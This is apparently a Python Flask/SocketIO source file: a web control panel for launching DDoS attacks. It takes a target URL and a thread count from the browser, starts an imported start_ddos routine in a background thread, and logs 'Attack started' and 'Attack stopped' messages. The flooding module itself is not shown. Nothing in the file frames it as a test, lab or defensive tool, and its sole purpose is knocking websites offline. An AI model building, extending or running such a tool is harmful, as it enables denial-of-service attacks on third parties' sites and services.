from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import threading
from ddos_module import start_ddos, stop_ddos

app = Flask(__name__)
socketio = SocketIO(app)

@app.route("/", methods=["GET", "POST"])
def index():
    return render_template("index.html")

@socketio.on("start_attack")
def handle_attack(data):
    url = data.get("url")
    num = int(data.get("num", 10))
    threading.Thread(target=start_ddos, args=(url, num, socketio), daemon=True).start()
    emit("log", f"Attack started on {url} with {num} threads.")

@socketio.on("stop_attack")
def handle_stop():
    stop_ddos()
    emit("log", "Attack stopped.")

@socketio.on("clear_logs")
def handle_clear():
    emit("clear")

if __name__ == "__main__":
    socketio.run(app, debug=True)
